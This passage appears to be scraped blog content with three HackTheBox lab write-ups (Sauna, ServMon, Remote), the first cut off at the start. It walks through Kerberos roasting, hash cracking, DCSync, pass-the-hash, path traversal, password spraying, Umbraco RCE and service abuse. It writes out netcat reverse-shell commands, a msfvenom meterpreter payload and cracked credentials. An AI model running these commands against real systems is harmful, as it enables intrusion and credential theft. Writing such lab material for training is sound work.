registry, and a DCSync attack to pull Active Directory password hashes.\nSauna starts by generating a list of potential usernames from its website, which is then used to perform AS-REP roasting attack and obtain the Kerberos TGT from one of the users. The TGT can be cracked to obtain the user\u0026rsquo;s password. With the obtained password, I\u0026rsquo;m able to gain a foothold on the machine. Internal enumeration finds AutoLogon credentials from the registry. BloodHound discovers these credentials can be leveraged to perform a DCSync attack and obtain all of the NTLM hashes from the Active Directory database. Armed with the administrator hash, I\u0026rsquo;m able to gain an interactive shell access as NT Authority\\System.\nSkills Learned  Generating potential usernames AS-Rep roasting BloodHound  Tools  Kali Linux (Attacking Machine) - https://www.kali.org/ Nmap - Preinstalled in Kali Linux Impacket - https://github.com/SecureAuthCorp/impacket BloodHound - https://github.com/BloodHoundAD/BloodHound  Reconnaissance Nmap Port scanning is the first thing I\u0026rsquo;d do.\n→ root@iamf «sauna» «192.168.2.103» $ nmap -sV -sC -oA nmap/sauna \u0026#39;10.10.10.175\u0026#39; ... \u0026lt;snip\u0026gt; ... PORT STATE SERVICE VERSION 53/tcp open domain? | fingerprint-strings: | DNSVersionBindReqTCP: | version |_ bind 80/tcp open http Microsoft IIS httpd 10.0 | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/10.0 |_http-title: Egotistical Bank :: Home 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2020-04-22 00:45:32Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port53-TCP:V=7.80%I=7%D=4/21%Time=5E9F315E%P=x86_64-pc-linux-gnu%r(DNSV SF:ersionBindReqTCP,20,\u0026#34;\\0\\x1e\\0\\x06\\x81\\x04\\0\\x01\\0\\0\\0\\0\\0\\0\\x07version\\ SF:x04bind\\0\\0\\x10\\0\\x03\u0026#34;); Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: 6h59m28s | smb2-security-mode: | 2.02: |_ Message signing enabled and required | smb2-time: | date: 2020-04-22T00:47:55 |_ start_date: N/A ... \u0026lt;snip\u0026gt; ... Based on the result above, Sauna is an Active Directory domain controller (DC) bundled with the IIS web server.\nnmap also identified Sauna\u0026rsquo;s domain name as EGOTISTICAL-BANK.LOCAL.\n Active Directory domain is similar to web domain both in concept and usage, but the realm is different. Active Directory domain is intended for internal/private networks only (e.g. between branch offices), so it is restricted to the outside world.\n Enumeration TCP 80 - Website Web Pages Overview These are some overview of the web pages.\nThe input vectors doesn\u0026rsquo;t seem injectable.\nGenerating Usernames These are the hints given by the author:\nThe first one is the word \u0026ldquo;roast\u0026rdquo; on the homepage and the contact page. This might refer to the AS-REP roasting attack.\nI got a loan and can\u0026#39;t pay it back, I cant even get a ticket to roast my chestnuts! We will always try to never answer your quetsions - we\u0026#39;re too busy roasting in the sauna, counting our money The second one is the word \u0026ldquo;only one\u0026rdquo;, this can be interpreted as only one of the users is vulnerable.\nMeet the team. So many bank account managers but only one security manager. Sounds about right! From here, I manually collected the team names from the site and created a script to generate usernames based on their first and last names.\n Based on common/best practices of AD user naming conventions\n #!/usr/bin/python3 import sys def convert_name(userfile): f = open(userfile, \u0026#39;r\u0026#39;) for line in f.readlines(): data = \u0026#34;\u0026#34;.join(line.split(\u0026#39;\\n\u0026#39;)) names = data.split(\u0026#39; \u0026#39;) first_letter = names[0][0] first_name = names[0] lastname = names[1] print(f\u0026#39;{first_name}.{lastname}\u0026#39;) print(f\u0026#39;{first_letter}{lastname}\u0026#39;) print(f\u0026#39;{first_letter}.{lastname}\u0026#39;) print(f\u0026#39;{first_letter}a{lastname}\u0026#39;) print(f\u0026#39;{first_letter}e{lastname}\u0026#39;) if __name__ == \u0026#39;__main__\u0026#39; : try: namelist = sys.argv[1].strip() except IndexError: print(\u0026#34;[-] Usage: ./convert-name.py listnames\u0026#34;) exit(-1) convert_name(namelist) Below are the generated usernames from the script.\n→ root@iamf «sauna» «192.168.2.103» $ python convert-name.py listnames Fergus.Smith FSmith F.Smith FaSmith FeSmith Shaun.Coins SCoins S.Coins SaCoins SeCoins Hugo.Bear HBear H.Bear HaBear HeBear Steven.Kerb SKerb S.Kerb SaKerb SeKerb Bowie.Taylor BTaylor B.Taylor BaTaylor BeTaylor Sophie.Driver SDriver S.Driver SaDriver SeDriver Foothold Shell as Fsmith AS-REP Roasting  On Forest Write-up, I briefly explained about AS-REP Roasting.\n With the generated usernames, AS-REP roasting attack can be performed using GetNPUsers.py from Impacket.\n→ root@iamf «sauna» «192.168.2.103» $ GetNPUsers.py -dc-ip \u0026#39;10.10.10.175\u0026#39; -request EGOTISTICAL-BANK.LOCAL/ -usersfile ADUser.txt -format hashcat -output ADuserTGT.txt It successfully obtained FSmith\u0026rsquo;s TGT.\nCracking TGT hashcat successfully cracked the TGT (performed on my Windows machine).\nC:\\tools\\hashcat6\u0026gt;hashcat.exe -m 18200 \u0026#39;$krb5asrep$23$FSmith@EGOTISTICAL-BANK.LOCAL:c4f6edd3e30ea0797b114bdb36b15e10$737ca27f2844d44e868f9ab86f72af0d8d27ce9385864d763a4dae0205efb764a954abe02e0ed1006af6f42268fbb6250f9c2f515fc4478b96051d124cb110aba85e960081b69ea9f21b4b761be007f1655a9a79ac00e2495c8125d56ff31b97b9f7021a84cd232d960ed29d5e536a6893aa0ec722c5132d80f61a3b04559409a5933ae1426a8170a14f673ff0cd5449d9e013193a1c75c4293404c76c42dd20b3f6d0e30cbf946566a0bd09d075781a18062f96ca083e9a7394cf6cd6c7e17e1f926cb4b32efa18d850582185e9cfb9f0b7f7d588ff9ff3ca9fed5bbd7c1a29e38d626f4ac7b6e756e0c81d3b21b7bb956d0a3fe0368a66bc1daa30140bffcc\u0026#39; C:/tools/rockyou.txt ... \u0026lt;snip\u0026gt; ... $krb5asrep$23$FSmith@EGOTISTICAL-BANK.LOCAL:c4f6edd3e30ea0797b114bdb36b15e10$737ca27f2844d44e868f9ab86f72af0d8d27ce9385864d763a4dae0205efb764a954abe02e0ed1006af6f42268fbb6250f9c2f515fc4478b96051d124cb110aba85e960081b69ea9f21b4b761be007f1655a9a79ac00e2495c8125d56ff31b97b9f7021a84cd232d960ed29d5e536a6893aa0ec722c5132d80f61a3b04559409a5933ae1426a8170a14f673ff0cd5449d9e013193a1c75c4293404c76c42dd20b3f6d0e30cbf946566a0bd09d075781a18062f96ca083e9a7394cf6cd6c7e17e1f926cb4b32efa18d850582185e9cfb9f0b7f7d588ff9ff3ca9fed5bbd7c1a29e38d626f4ac7b6e756e0c81d3b21b7bb956d0a3fe0368a66bc1daa30140bffcc:Thestrokes23 Session..........: hashcat Status...........: Cracked Hash.Name........: Kerberos 5, etype 23, AS-REP Hash.Target......: $krb5asrep$23$FSmith@EGOTISTICAL-BANK.LOCAL:c4f6edd...0bffcc ... \u0026lt;snip\u0026gt; ... The password is Thestrokes23.\nRemote Access This user can login remotely with evil-winrm.\n→ root@iamf «sauna» «192.168.2.103» $ evil-winrm -i \u0026#39;10.10.10.175\u0026#39; -u fsmith -p \u0026#39;Thestrokes23\u0026#39; User flag is done here.\n  Privilege Escalation Shell as svc_loanmgr Enumeration WinPEAS discovered that svc_loanmanager has an autologon credential.\n  But based on rpcclient, it\u0026rsquo;s actually svc_loanmgr.\n  This account also can login remotely.\n→ root@iamf «sauna» «192.168.2.103» $ evil-winrm -i \u0026#39;10.10.10.175\u0026#39; -u svc_loanmgr -p \u0026#39;Moneymakestheworldgoround!\u0026#39; Evil-WinRM shell v2.3 Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\svc_loanmgr\\Documents\u0026gt; Shell as NT Authority\\System Enumeration with BloodHound I ran the second WinPEAS scan, but found nothing particularly interesting (this was prior to zerologon). Since this is an AD environment, I can try BloodHound.\nI copied SharpHound.exe (the ingestor) to Sauna using evilwin-rm and ran it to start collecting data.\n evilwin-rm has capability to transfer files directly between my machine and the remote (Sauna). The keywords are download and upload.\n   It finished within a few seconds.\nI copied the collected data to my machine and loaded it to BloodHound with drag and drop.\n  After trying a few of BloodHound\u0026rsquo;s prebuilt queries, BloodHound reveals that svc_loanmgr has GetChangesAll and GetChanges permissions on the domain.\nI can access the help section by right clicking the edge. So, GetChanges and GetChangesAll are in conjunction with DS-Replication-Get-Changes-All. This grants svc_loanmgr ability to perform the DCSync attack.\nThe \u0026ldquo;Abuse Info\u0026rdquo; section contains how to abuse these privileges using mimikatz\nCredential Dumping Since Windows Defender typically doesn\u0026rsquo;t get along with mimikatz, I use secretsdump.py to perform a DCSync attack just like I did on Forest.\n→ root@iamf «sauna» «192.168.2.103» $ secretsdump.py EGOTISTICAL-BANK.LOCAL/svc_loanmgr:\u0026#39;Moneymakestheworldgoround!\u0026#39;@10.10.10.175 -just-dc-ntlm Pass the hash - psexec.py Now I can use psexec.py to perform pass-the-hash using administrator hash to gain shell access as local system.\n→ root@iamf «sauna» «192.168.2.103» $ psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff administrator@htb.sauna ","permalink":"https://fahmifj.github.io/writeups/hackthebox/htb-sauna/","summary":"Sauna is another Active Directory box with easy difficulty from Hack The Box that covers several Active Directory kill chain techniques, such as AS-REP roasting attack, finding credentials on registry, and a DCSync attack to pull Active Directory password hashes.\nSauna starts by generating a list of potential usernames from its website, which is then used to perform AS-REP roasting attack and obtain the Kerberos TGT from one of the users.","tags":["OSCP-plus","Windows","Active-Directory","Domain-controller","ASREP-roasting","Kerberos","BloodHound","SharpHound","DCSync","evil-winrm","secretsdump.py","psexec.py"],"title":"HackTheBox - Sauna"},{"content":"ServMon starts with FTP anonymous access that allows me to read the users' notes. One of these notes contains a hint to a location of a password list in one of the user\u0026rsquo;s dekstops. A Path Traversal vulnerability on the installed NVMS-1000 is exploited to obtain the password list. With a password spray attack, I\u0026rsquo;m able to gain a foothold on the system .\nIn the NSClient++ default installation folder, there is a config file which contains a set of credentials. With these credentials, I can use public exploits for NSClient++ and gain interactive shell access as NT Authority\\System.\nSkills Learned  Directory/Path Traversal NVMS-1000 exploitation NSClient-0.5.2.35 exploitation Port Forwarding/Tunneling  Tools  CrackMapExec - https://github.com/byt3bl33d3r/CrackMapExec BurpSuite - https://portswigger.net/burp NSClient-0.5.2.35 Exploit PoC - https://packetstormsecurity.com/files/157306/NSClient-0.5.2.35-Authenticated-Remote-Code-Execution.html  Reconnaissance Nmap → root@iamf «servmon» «10.10.14.23» $ nmap -sC -sV -oA nmap/initial-servmon \u0026#39;10.10.10.184\u0026#39;  -sC, to scan with default script -sV, to scan service version -oA, to save the output in all format (xml, nmap, gnmap) -v, verbose mode.  PORT STATE SERVICE VERSION 21/tcp open ftp Microsoft ftpd | ftp-anon: Anonymous FTP login allowed (FTP code 230) |_01-18-20 12:05PM \u0026lt;DIR\u0026gt; Users | ftp-syst: |_ SYST: Windows_NT 22/tcp open ssh OpenSSH for_Windows_7.7 (protocol 2.0) | ssh-hostkey: | 2048 b9:89:04:ae:b6:26:07:3f:61:89:75:cf:10:29:28:83 (RSA) | 256 71:4e:6c:c0:d3:6e:57:4f:06:b8:95:3d:c7:75:57:53 (ECDSA) |_ 256 15:38:bd:75:06:71:67:7a:01:17:9c:5c:ed:4c:de:0e (ED25519) 80/tcp open http | fingerprint-strings: | GetRequest, HTTPOptions, RTSPRequest: | HTTP/1.1 200 OK | Content-type: text/html | Content-Length: 340 | Connection: close | AuthInfo: | \u0026lt;!DOCTYPE html PUBLIC \u0026#34;-//W3C//DTD XHTML 1.0 Transitional//EN\u0026#34; \u0026#34;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\u0026#34;\u0026gt; | \u0026lt;html xmlns=\u0026#34;http://www.w3.org/1999/xhtml\u0026#34;\u0026gt; | \u0026lt;head\u0026gt; | \u0026lt;title\u0026gt;\u0026lt;/title\u0026gt; | \u0026lt;script type=\u0026#34;text/javascript\u0026#34;\u0026gt; | window.location.href = \u0026#34;Pages/login.htm\u0026#34;; | \u0026lt;/script\u0026gt; | \u0026lt;/head\u0026gt; | \u0026lt;body\u0026gt; | \u0026lt;/body\u0026gt; | \u0026lt;/html\u0026gt; | NULL: | HTTP/1.1 408 Request Timeout | Content-type: text/html | Content-Length: 0 | Connection: close |_ AuthInfo: |_http-title: Site doesn\u0026#39;t have a title (text/html). 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds? 5666/tcp open tcpwrapped 6699/tcp open napster? 8443/tcp open ssl/https-alt | fingerprint-strings: | FourOhFourRequest, HTTPOptions, RTSPRequest, SIPOptions: | HTTP/1.1 404 | Content-Length: 18 | Document not found | GetRequest: | HTTP/1.1 302 | Content-Length: 0 | Location: /index.html |_ refox/68.0 | http-title: NSClient++ |_Requested resource was /index.html | ssl-cert: Subject: commonName=localhost | Not valid before: 2020-01-14T13:24:20 |_Not valid after: 2021-01-13T13:24:20 |_ssl-date: TLS randomness does not represent time 2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service : ==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)============== SF-Port80-TCP:V=7.80%I=7%D=4/12%Time=5E93410A%P=x86_64-pc-linux-gnu%r(NULL SF:,6B,\u0026#34;HTTP/1\\.1\\x20408\\x20Request\\x20Timeout\\r\\nContent-type:\\x20text/ht SF:ml\\r\\nContent-Length:\\x200\\r\\nConnection:\\x20close\\r\\nAuthInfo:\\x20\\r\\n SF:\\r\\n\u0026#34;)%r(GetRequest,1B4,\u0026#34;HTTP/1\\.1\\x20200\\x20OK\\r\\nContent-type:\\x20tex SF:t/html\\r\\nContent-Length:\\x20340\\r\\nConnection:\\x20close\\r\\nAuthInfo:\\x .... Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: -28s | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2020-04-12T16:27:15 |_ start_date: N/A RPC (135), NetBIOS (139), and SMB (445) are the known ports for Windows box.\nBesides these standard ports, there are some interesting services installed on the box:\n FTP with anonymous login on port 21, SSH service on port 22 HTTPS service on non-standard port 8443.  This machine probably is not an Active Directory.\nEnumeration TCP 21 - FTP ...\u0026lt;SNIP\u0026gt;... 21/tcp open ftp Microsoft ftpd | ftp-anon: Anonymous FTP login allowed (FTP code 230) |_01-18-20 12:05PM \u0026lt;DIR\u0026gt; Users ...\u0026lt;SNIP\u0026gt;... Based on nmap scans, the FTP root directory contains the Users folder. Inside the Users folder, I found two subfolders, one is Nathan and the other is Nadine. Both of these users' folders contain a text file, I copied these files to my machine.\nThe first file is Confidential.txt. It contains a note from Nadine to Nathan.\nNathan, I left your Passwords.txt file on your Desktop. Please remove this once you have edited it yourself and place it back into the secure folder. Regards Nadine The second file is Notes to do.txt. It contains a to do list.\n1) Change the password for NVMS - Complete 2) Lock down the NSClient Access - Complete 3) Upload the passwords 4) Remove public access to NVMS 5) Place the secret files in SharePoint I\u0026rsquo;ll note that there\u0026rsquo;s a Password.txt text on Nathan\u0026rsquo;s desktop and the uncompleted to do.\nTCP 445 - SMB Anonymous login is not allowed, so nothing to see here.\nTCP 80 - Website Visiting port 80 redirects me to a login page on Pages/login.htm\nBased on Google, NVSMS-1000 is a software for CCTV monitoring. I don\u0026rsquo;t find the default credentials, and it doesn\u0026rsquo;t seem to work with common credentials.\nExploit-DB A quick search on exploit-db shows it is vulnerable to Directory Traversal.\n PoC: https://www.exploit-db.com/exploits/47774\n # Title: NVMS-1000 - Directory Traversal # Date: 2019-12-12 # Author: Numan Türle # Vendor Homepage: http://en.tvt.net.cn/ # Version : N/A # Software Link : http://en.tvt.net.cn/products/188.html POC --------- GET /../../../../../../../../../../../../windows/win.ini HTTP/1.1 Host: 12.0.0.1 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3 Accept-Encoding: gzip, deflate Accept-Language: tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7 Connection: close Response --------- ; for 16-bit app support [fonts] [extensions] [mci extensions] [files] [Mail] MAPI=1 There\u0026rsquo;s no version is specified, but I\u0026rsquo;ll give it a try.\nTCP 8443 - NSClient++ Exploit-DB It took ages to load every page on this site. A quick search on Google shows that NSClient++ is another monitoring software. Adding \u0026lsquo;exploit\u0026rsquo; to the keyword pops up an exploit link that refers to exploit-DB:\n Manual PoC: https://www.exploit-db.com/exploits/46802 Scripted PoC: https://packetstormsecurity.com/files/157306/NSClient-0.5.2.35-Authenticated-Remote-Code-Execution.html  Foothold Shell as nadine  I\u0026rsquo;ve added htb.servmon to my /etc/hosts, so it will resolve to 10.10.10.184. I know htb.servmon looks weird, but that\u0026rsquo;s me in the past hehe..\n NVMS-1000 Directory Traversal - Obtain Passwords.txt I started BurpSuite and performed directory traversal based on the PoC above against NVMS-1000\nIt returns a list of passwords\nPassword spraying I created a usernames list and a password list:\n  users.txt\nnathan nadine   passwords.txt\n1nsp3ctTh3Way2Mars! Th3r34r3To0M4nyTrait0r5! B3WithM30r4ga1n5tMe L1k3B1gBut7s@W0rk 0nly7h3y0unGWi11F0l10w IfH3s4b0Utg0t0H1sH0me Gr4etN3w5w17hMySk1Pa5$   With these, a password spray can be performed using CrackMapExec. It hits on nadine:L1k3B1gBut7s@W0rk pair.\n→ root@iamf «servmon» «10.10.14.23» $ crackmapexec smb htb.servmon -u users -p passwords ...\u0026lt;SNIP\u0026gt;... SMB 10.10.10.184 445 SERVMON [+] SERVMON\\nadine:L1k3B1gBut7s@W0rk ...\u0026lt;SNIP\u0026gt;... SSH access The credentials also work on SSH.\n→ root@iamf «servmon» «10.10.14.23» $ ssh nadine@htb.servmon   Privilege Escalation Shell as NT Authority\\System Obtain NSClient++ password 3) Upload the passwords 4) Remove public access to NVMS 5) Place the secret files in SharePoint Recall the to do list from previous enumeration, I discovered a password for NSClient++ in its default installation folder.\nPS C:\\\u0026gt; gc \u0026#39;Program Files\\NSClient++\\nsclient.ini\u0026#39;   I\u0026rsquo;ll try the scripted PoC. But before that, I\u0026rsquo;ll need to tunnel the connection first. This is because the config file is set to local only, so I can\u0026rsquo;t perform exploit directly from outside.\nSSH Tunneling SSH has tunneling features which allow me to access ServMon localhost and port from my localhost and specified port. For this, I\u0026rsquo;ll create another SSH connection for tunneling.\n→ root@iamf «servmon» «10.10.14.23» $ ssh -L 8443:127.0.0.1:8443 nadine@10.10.10.184 -L 8443:127.0.0.1:8443 means it will forward any connection on my localhost port 8443 to remote localhost on port 8443. In this case, ServMon is the remote. Now I can perform exploitation.\nNSClient++ Exploit PoC First, I\u0026rsquo;ll create a batch, called sans.bat file on my machine.\n@echo off C:\\Temp\\nc.exe 10.10.14.23 443 -e powershell.exe Once it created, I\u0026rsquo;ll transfer the file to ServMon on C:\\temp\\ via python http server along with netcat for windows.\n→ root@iamf «servmon» «10.10.14.23» $ Python -m SimpleHTTPServer 80 Get the hosted files on ServMon\nPS C:\\\u0026gt; Invoke-webrequest -uri http://10.10.14.23/reverse -outfile C:/temp/reverse.bat PS C:\\\u0026gt; Invoke-webrequest -uri http://10.10.14.23/nc.exe -outfile C:/temp/nc.exe Now I\u0026rsquo;ll setup a listener on my Kali.\n→ root@iamf «servmon» «10.10.14.23» $ nc -nlvvp 443 Then I can just run the exploit and wait on my listener.\n→ root@iamf «servmon» «10.10.14.23» $ python3 nsRCE.py -t 127.0.0.1 -P 8443 -p \u0026#39;ew2x6SsGTxjRwXOT\u0026#39; -c \u0026#34;c:\\temp\\reverse.bat\u0026#34; Now I have an interactive shell as NT Authority\\SYSTEM.\n References  https://packetstormsecurity.com/files/157306/NSClient-0.5.2.35-Authenticated-Remote-Code-Execution.html  ","permalink":"https://fahmifj.github.io/writeups/hackthebox/htb-servmon/","summary":"ServMon starts with FTP anonymous access that allows me to read the users' notes. One of these notes contains a hint to a location of a password list in one of the user\u0026rsquo;s dekstops. A Path Traversal vulnerability on the installed NVMS-1000 is exploited to obtain the password list. With a password spray attack, I\u0026rsquo;m able to gain a foothold on the system .\nIn the NSClient++ default installation folder, there is a config file which contains a set of credentials.","tags":["OSCP-like","Windows","Directory-traversal","NVMS-1000","NSClient","Tunneling"],"title":"HackTheBox - ServMon"},{"content":"Remote features an instance of Umbraco CMS which is vulnerable to an authenticated remote code execution (RCE). Enumeration of publicly accessible backup on NFS share finds credentials. These credentials allows me to gain a foothold in the system. Enumerating with WinPEAS finds two privilege escalation vectors: TeamViewer7 and service abuse. TeamViewer7 is found to be vulnerable to CVE-2019–18988, and Metasploit has a module for this CVE and it allows me to obtain the TeamViewer credentials. The credentials can be used to login as administrator account. As an alternative, the user has a full access on UsoSvc service, and this can be abused to gain SYSTEM access.\nSkills Learned  NFS enumeration Umbraco CMS 7.12.4 exploitation Metasploit  Tools  Kali Linux (Attacking Machine) - https://www.kali.org/ Nmap - Preinstalled in Kali Linux metasploit - Preinstalled in Kali Linux nfs-common - apt install nfs-common  Reconnaissance Nmap → root@iamf «remote» «10.10.14.3» $ nmap -sC -sV -oA scans/initial-remote \u0026#39;10.10.10.180\u0026#39;  -sC, to scan with default script -sV, to scan service version -oA, to save the output to all format (xml, nmap, gnmap) -v, verbose mode.  ... \u0026lt;snip\u0026gt; ... Host is up (0.20s latency). Not shown: 993 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp Microsoft ftpd #1 |_ftp-anon: Anonymous FTP login allowed (FTP code 230) | ftp-syst: |_ SYST: Windows_NT 80/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) #2 |_http-title: Home — Acme Widgets 111/tcp open rpcbind 2–4 (RPC #100000) | rpcinfo: | program version port/proto service | 100000 2,3,4 111/tcp rpcbind | 100000 2,3,4 111/tcp6 rpcbind | 100000 2,3,4 111/udp rpcbind | 100000 2,3,4 111/udp6 rpcbind | 100003 2,3 2049/udp nfs | 100003 2,3 2049/udp6 nfs | 100003 2,3,4 2049/tcp nfs | 100003 2,3,4 2049/tcp6 nfs | 100005 1,2,3 2049/tcp mountd | 100005 1,2,3 2049/tcp6 mountd | 100005 1,2,3 2049/udp mountd | 100005 1,2,3 2049/udp6 mountd | 100021 1,2,3,4 2049/tcp nlockmgr | 100021 1,2,3,4 2049/tcp6 nlockmgr | 100021 1,2,3,4 2049/udp nlockmgr | 100021 1,2,3,4 2049/udp6 nlockmgr | 100024 1 2049/tcp status | 100024 1 2049/tcp6 status | 100024 1 2049/udp status |_ 100024 1 2049/udp6 status 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds? 2049/tcp open mountd 1–3 (RPC #100005) #3 Service Info: OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results: |_clock-skew: -25s | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2020–03–28T21:04:26 |_ start_date: N/A ... \u0026lt;snip\u0026gt; ... The result shows a bunch of open ports.\nEnumeration TCP 21 - FTP Anonymous login is allowed, but nothing here.\nTCP 80 - Website In contact menu, there\u0026rsquo;s a button that points to http://10.10.10.180/umbraco/#/login/false?returnPath=%252Fforms\nThe link brought me into Umbraco\u0026rsquo;s login page.\n  Brute forcing some common credentials with Burp doesn't show any difference. TCP 2049 - NFS NFS shares can be enumerated using the showmount command.\n If you don’t have it, install with sudo apt install nfs-common\n → root@iamf «remote» «10.10.14.3» $ showmount -e \u0026#39;10.10.10.180\u0026#39; Export list for 10.10.10.180: /site_backups I can mount the share to my Kali because it is accessible to everyone.\n→ root@iamf «remote» «10.10.14.3» $ mount -t nfs 10.10.10.180:/site_backups /mnt/iamf When I ran the find command on the mounted NFS, I discovered two interesting files: embraco.config and umbraco.sdf.\n→ root@iamf «iamf» «10.10.14.3» $ find . -type f 2\u0026gt;/dev/null ...\u0026lt;snip\u0026gt;... ./App_Data/TEMP/PluginCache/umbraco-plugins.INTRANET.list ./App_Data/TEMP/PluginCache/umbraco-plugins.REMOTE.hash ./App_Data/TEMP/PluginCache/umbraco-plugins.REMOTE.list ./App_Data/umbraco.config ./App_Data/Umbraco.sdf ./App_Plugins/ModelsBuilder/modelsbuilder.controller.js ./App_Plugins/ModelsBuilder/modelsbuilder.htm ./App_Plugins/ModelsBuilder/modelsbuilder.resource.js ...\u0026lt;snip\u0026gt;... umbraco.config is a config file formatted in xml and umbraco.sdf is a database file.\n  The config file doesn\u0026rsquo;t store credentials.\nSince the database file is a binary, the strings and grep command can be used to display some readable strings such as \u0026ldquo;admin\u0026rdquo;.\n→ root@iamf «remote» «10.10.14.3» $ strings App_Data/umbraco.sdf | grep -i admin ...\u0026lt;snip\u0026gt;... Administratoradminb8be16afba8c314ad33d812f22a04991b90e2aaa{“hashAlgorithm”:”SHA1\u0026#34;}en-USf8512f97-cab1–4a4b-a49f-0a2054c47a1d adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{“hashAlgorithm”:”SHA1\u0026#34;}admin@htb.localen-USfeb1a998-d3bf-406a-b30b-e269d7abdf50 adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{“hashAlgorithm”:”SHA1\u0026#34;}admin@htb.localen-US82756c26–4321–4d27-b429–1b5c7c4f882f User “admin” \u0026lt;admin@htb.local\u0026gt;192.168.195.1User “admin” \u0026lt;admin@htb.local\u0026gt;umbraco/user/password/changepassword change User “admin” \u0026lt;admin@htb.local\u0026gt;192.168.195.1User “admin” \u0026lt;admin@htb.local\u0026gt;umbraco/user/sign-in/logoutlogout success User “SYSTEM” 192.168.195.1User “admin” \u0026lt;admin@htb.local\u0026gt;umbraco/user/saveupdating LastLoginDate, ...\u0026lt;snip\u0026gt;... From the output above, I can only guess this is the correct pair of username and password. admin@htb.local:b8be16afba8c314ad33d812f22a04991b90e2aaa\nThe password that was identified as SHA1 can be cracked online with crackstation. The password is bacondandcheese\nFoothold Shell as IIS apppool Access on Umbraco CMS The credential can be used on Umbraco CMS.\nI can see the CMS version by accessing the menu on the left side. A quick search on Google reveals the current version is vulnerable to RCE.\n Offensive Security\u0026rsquo;s Exploit Database ArchiveUmbraco CMS 7.12.4 - (Authenticated) Remote Code Execution.. webapps exploit for ASPX platformwww.exploit-db.com\n I copied the exploit and ran it.\n→ root@iamf «Umbraco-RCE» «10.10.14.3» $ python exploit.py -u admin@htb.local -p baconandcheese -i http://10.10.10.180 -c powershell.exe -a ‘ls c:/’ Persistent Shell - Meterpreter I can upgrade the RCE to a persistent shell by sending a PowerShell one liner payload or use msfvenom to craft a payload.\n I don\u0026rsquo;t remember correctly, but I think I messed up with the one liner, so I go with msfvenom.\n Upload features from Umbraco didn\u0026rsquo;t restrict .exe file. It is located on /media and the directory of the uploaded file is located on C:/inetpub/wwwroot/media/[itemID]/payload.exe\nI\u0026rsquo;ll create a executable reverse shell and upload it to Umbraco /media page and have listener using Metasploit listening on the specified port.\n→ root@iamf «remote» «10.10.14.3» $ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.23 LPORT=4444 -a x86 -f exe \u0026gt; fremote.exe Then I\u0026rsquo;ll just execute my payload on C:/inetpub/wwwroot/media/1136/fremote.exe\n→ root@iamf «remote» «10.10.14.3» $ python exploit.py -u admin@htb.local -p baconandcheese -i http://10.10.10.180 -c cmd.exe -a ‘C:/inetpub/wwwroot/media/1136/fremote.exe’ I can spawn PowerShell by typing\nexecute -f powershell.exe   Privilege Escalation Shell as Administrator For the last part, I have two options to gain administrator or system access: TeamViewer7 CVE-2019-18988 and abusing UsoSvc . For UsoSvc, I\u0026rsquo;m still unsure if it came from the box or was caused by other players, but I\u0026rsquo;ll show both.\nTeamViewer7 CVE-2019-18988 WinPEAS shows there\u0026rsquo;s TeamViewer7 service currently running. This version is vulnerable to CVE-2019-18988\nFrom https://nvd.nist.gov/vuln/detail/CVE-2019-18988:\n It used a shared AES key for all installations since at least as far back as v7.0.43148, and used it for at least OptionsPassword AES in the current version of the product\n ========================================(Services Information)======================================== ... \u0026lt;snip\u0026gt; ... TeamViewer7(TeamViewer GmbH - TeamViewer 7)[\u0026#34;C:\\Program Files (x86)\\TeamViewer\\Version7\\TeamViewer_Service.exe\u0026#34;] - Auto - Running TeamViewer Remote Software ================================================================================================= UsoSvc(Update Orchestrator Service)[cmd \\c C:\\Users\\nc.exe 10.10.14.8 4444 -e cmd.exe] - Auto - Stopped - No quotes and Space detected YOU CAN MODIFY THIS SERVICE: AllAccess, Start Manages Windows Updates. If stopped, your devices will not be able download and install latest udpates. ================================================================================================= ... \u0026lt;snip\u0026gt; ... Because metasploit has a post module for that CVE, so I could simply background the current session and run the post module.\nmeterpreter \u0026gt; run post/windows/gather/credentials/teamviewer_passwords Remote Access - Evil-WinRM The password itself is reused by the administrator account.\n→ root@iamf «remote» «10.10.14.3» $ evil-winrm -u administrator -p \u0026#39;!R3m0te!\u0026#39; -i htb.remote   (Alternative) Abusing UsoSvc service If this service was originally from the box, I could just modify the UsoSvc executable path to point to my previous uploaded payload\nPS C:\\\u0026gt; sc.exe config usosvc binPath=\u0026#34;C:/inetpub/wwwroot/media/1136/fremote.exe\u0026#34; 